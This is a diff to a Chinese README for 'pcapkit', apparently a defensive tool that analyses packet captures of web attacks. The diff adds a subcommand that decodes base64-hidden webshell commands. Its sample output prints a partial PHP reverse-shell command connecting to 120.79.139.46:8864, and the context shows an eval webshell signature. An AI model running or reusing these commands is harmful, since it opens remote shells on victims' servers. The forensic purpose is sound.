@@ -46,11 +46,14 @@ python scripts/pcapkit.py stream 流量.pcap 13706
 # 4. 证据落地：响应体 + multipart 里上传的木马本体
 python scripts/pcapkit.py export 流量.pcap -d objects/
 
-# 5. 出报告
+# 5. 解 base64 参数：蚁剑/冰蝎的命令与反弹地址都藏在这里
+python scripts/pcapkit.py b64 流量.pcap
+
+# 6. 出报告
 python scripts/pcapkit.py report 流量.pcap -d report/
 ```
 
-## 六个子命令
+## 七个子命令
 
 | 子命令 | 作用 | 关键参数 |
 |---|---|---|
@@ -58,6 +61,7 @@ python scripts/pcapkit.py report 流量.pcap -d report/
 | `http` | 列出全部 HTTP 请求，可导出 CSV | `--csv out.csv` `--limit N` |
 | `grep` | 请求行/头/体/响应体检索，自动比对 URL 解码后文本 | 多个模式并列 |
 | `stream` | 还原指定流：默认解码 HTTP 报文与 gzip，二进制自动转十六进制 | `--raw`（线上原始字节） `--limit N` |
+| `b64` | 解出 base64 包裹的命令/地址（蚁剑、冰蝎、哥斯拉） | `--all` 显示全部解码结果 |
 | `export` | 落盘响应体、POST 体、multipart 文件片段 | `--all` `--post` `--min-size` |
 | `report` | 生成 Markdown 取证报告 | `--max-events N` |
 
@@ -74,6 +78,15 @@ python scripts/pcapkit.py report 流量.pcap -d report/
   [命中] 木马文件上传          2 次  首现 16:47:27  <.php">
   [命中] WebShell 控制    16 次  首现 16:48:07  <?php eval($_post>
   [推断] 目录扫描       1 个 UA 的 404 占比 ≥60%（UA 已伪装，签名不命中还要看行为）
+```
+
+`b64` 则从蚁剑的参数里解出了藏在 base64 中的反弹命令（HTTP 明文完全看不到）：
+
+```
+[stream 13731] 2020-05-08 16:54:05  反弹/C2 指令
+  请求体 / 参数 me491cb0d84ddc  (解码后 131 字节)
+  地址: 120.79.139.46:8864
+  内容: cd "/var/www/html/upload/img";php -r '$sock=fsockopen("120.79.139.46",8864);...
 ```
 
 `export` 把上传的木马单独落成文件，内容是典型的 `GIF89a` 头 + 一句话：
@@ -133,7 +146,8 @@ python tests/test_pcapkit.py          # 或 python -m unittest discover -s tests
 | TCP 重组 | 乱序（后段先到）、完全/部分重传、空洞记录、keep-alive 多报文 |
 | 解码 | gzip、zlib deflate、raw deflate、chunked、chunked+gzip、无头嗅探、截断容错、br 提示 |
 | 取证 | 八段签名命中、URL 编码 payload、404 率判扫描、multipart 木马拆分、报告结构 |
-| CLI | 六个子命令退出码、`--no-cache` 两种位置、`stream` 默认解码 vs `--raw` 字节一致性、异常输入 |
+| 编码载荷 | base64 命令识别、`%2B` 截断回归、哈希误判、`password=whoami` 误报 |
+| CLI | 七个子命令退出码、`--no-cache` 两种位置、`stream` 默认解码 vs `--raw` 字节一致性、异常输入 |
 
 其中 `test_out_of_order`、`test_keepalive_multi_message` 和 `test_url_encoded_payload_matched`
 是三个真实 bug 的回归锚点，改动重组/解析逻辑时必须先跑过。
